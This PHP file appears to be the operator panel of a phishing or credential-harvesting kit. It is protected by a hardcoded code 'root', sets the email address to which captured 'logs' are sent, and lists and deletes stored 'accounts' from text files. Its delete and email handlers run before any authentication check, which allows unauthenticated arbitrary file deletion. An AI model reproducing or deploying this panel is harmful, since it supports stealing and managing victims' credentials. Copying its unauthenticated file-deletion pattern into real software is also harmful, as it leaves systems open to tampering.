<?php
session_start();
error_reporting( 0 );
$pass = "root";
if ( $_POST[ 'accesscode' ] == $pass ) {
	$_SESSION[ 'l' ] = "auth";
}
if ( $_POST[ 'exit' ] == "exit" ) {
	unset( $_SESSION[ 'l' ] );
	session_destroy();

}
if ( isset( $_POST[ 'delete' ] ) ) {
	unlink( $_POST[ 'delete' ] );

}
if ( isset( $_POST[ 'em' ] ) ) {
	file_put_contents( "data/mail.txt", $_POST[ 'em' ] );

}
if ( ( !isset( $_SESSION[ 'l' ] ) )OR( $_SESSION[ 'l' ] != "auth" ) ) {

	?>
	<br/>
	<H4>Error.You are not admin.Enter login to enter</H4>
	<br/>
	<form name="f1" method="post" action="#">
		Access code: <br/>
		<input name="accesscode" type="text" size="25"/> <br/>

		<input type="submit" name="enter" value="Enter"/>
	</form>


	<?php
} else {

	?>
	<br/>
	<H2>Welcome!</H2>
	<br/>

	<form name="f1" method="post" action="#">

		<input name="exit" type="hidden" value="exit"/> <br/>

		<input type="submit" name="lgo" value="Logout"/>
	</form>
	<form name="f1" method="post" action="#">
		<br/>To set email where will be send all logs put desired email here
		<br/> Current e-mail:
		<?php print_r(file_get_contents("data/mail.txt")); ?>
		<br/>
		<input name="em" type="text" placeholder="put email here"/> <br/>

		<input type="submit" name="lgo" value="set e-mail"/>
	</form>
	<?php

	$files = glob( "data/serv/*.txt" );

	$cTimes = array_map( function ( $file ) {
		return filectime( $file );
	}, $files );
	$data = array_combine( $files, $cTimes );
	uasort( $data, function ( $a, $b ) {
		return $a - $b;
	} );
	$sortedFiles = array_keys( $data );
	if ( count( $sortedFiles ) > 0 ) {


		for ( $r = 0; $r <= count( $sortedFiles ) - 1; $r++ ) {

			echo( "</br>" );
			$text = file_get_contents( $sortedFiles[ $r ] );

			echo nl2br( htmlspecialchars( $text ) );
			echo( "</br>" );
			echo( "
</br>
Log creating date:" . date( "F d Y H:i:s.", filectime( $sortedFiles[ $r ] ) ) . "

</br>

" );
			echo( '


<form name="f1" method="post" action="#">

<input name="delete" type="hidden" value="' . $sortedFiles[ $r ] . '"  /> <br />

<input type="submit" name="lgo" value="delete" />
</form>

</br>' );
		}

	} else {
		echo( "<H3>There are no accounts</H3></br>" );
	}



	?>


	<?php

}
?>